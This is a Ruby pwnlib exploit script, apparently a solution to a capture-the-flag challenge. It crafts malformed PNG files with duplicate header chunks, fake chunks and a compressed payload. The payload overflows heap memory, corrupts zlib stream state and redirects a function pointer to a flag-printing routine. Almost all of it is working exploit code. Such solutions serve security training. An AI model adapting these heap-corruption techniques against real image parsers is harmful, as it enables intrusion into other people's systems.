#coding:ascii-8bit
require "pwnlib"
require "zlib"

class PwnTube
  def recv_until_prompt
    recv_until("> ")
  end
end

class Exploit
  attr_reader :tube, :host, :port
  attr_reader :offset, :got, :libc_offset

  def initialize(remote)
    @remote = remote
    if remote?
      # @host, @port = "localhost 51914".split
      @host = ENV["CHALL_HOST"]
      @port = ENV["CHALL_PORT"].to_i
    else
      @host = "localhost"
      @port = 51914
    end
    @port = @port&.to_i
    @libc_offset = {
    }

    @offset = {
      "give_flag2" => 0x401451
    }

    @got = {
    }
  end

  def remote?
    @remote
  end

  def create_chunk(type, data)
    a = ""
    a << [data.bytesize].pack("L>")
    a << type
    a << data
    a << [Zlib.crc32(type + data)].pack("L>")
    a
  end

  def header_chunk(width, height, bit_depth, color_type, compression_type = 0, filter_type = 0, interlace_type = 0)
    create_chunk("IHDR", [width, height, bit_depth, color_type, compression_type, filter_type, interlace_type].pack("L>L>C*"))
  end

  def data_chunk(data)
    create_chunk("IDAT", data)
  end

  def end_chunk
    create_chunk("IEND", "")
  end

  def fake_chunk
    create_chunk("FAKE", "")
  end

  def add_png(png)
    tube.recv_until_prompt
    tube.sendline("1")
    tube.recv_until("size of png: ")
    tube.sendline("#{png.bytesize}")
    tube.recv_until("send your png:")
    tube.send(png)
  end

  def delete_png(index)
    tube.recv_until_prompt
    tube.sendline("2")
    tube.recv_until("id: ")
    tube.sendline("#{index}")
  end

  def run(stage)
    PwnTube.open(host, port){|t|
      @tube = t

      header = "\x89PNG\x0d\x0a\x1a\x0a"

      heap_base = tube.recv_capture(/heap=(0x[0-9a-f]+)\n/m)[0].to_i(16) - 0x2a0
      puts "heap base = 0x%x" % heap_base

      if stage == 1
        png = ""
        png << header
        png << header_chunk(1, 0x34, 8, 0)
        png << header_chunk(0xff, 0x30, 8, 0)
        png << data_chunk(Zlib.deflate("\xff" * 0x3000))
        png << end_chunk

        add_png(png)

        puts tube.recv_capture(/(IERAE\{.*?\})/)[0]
      else
        png = ""
        png << header
        png << header_chunk(1, 1, 8, 0)
        png << data_chunk(Zlib.deflate("\xff" * 2))
        png << end_chunk

        add_png(png)
        delete_png(0)

        payload = ""
        payload << "A" * 0x48
        payload << [0x114514].pack("Q")
        payload << [0].pack("Q")  # size
        payload << [0].pack("Q")  # data
        payload << [0].pack("Q")  # next_in
        payload << [0].pack("Q")  # avail_in
        payload << [0].pack("Q")  # total_in
        payload << [0].pack("Q")  # next_out
        payload << [0].pack("Q")  # avail_out
        payload << [0].pack("Q")  # total_out
        payload << [0].pack("Q")  # msg
        payload << [heap_base + 0x2090].pack("Q")  # state
        payload << [offset["give_flag2"]].pack("Q") * 2

        png = ""
        png << header
        png << header_chunk(1, 0x48 / 2, 8, 0)
        png << header_chunk(0xff, 0x10, 8, 0)
        png << fake_chunk * 10
        png << data_chunk(Zlib.deflate(payload))
        png << end_chunk

        add_png(png)
        puts tube.recv_capture(/(IERAE\{.*?\})/)[0]
      end

      # tube.interactive
    }
  end
end

Exploit.new(ARGV[0] == "r").run(1)
Exploit.new(ARGV[0] == "r").run(2)
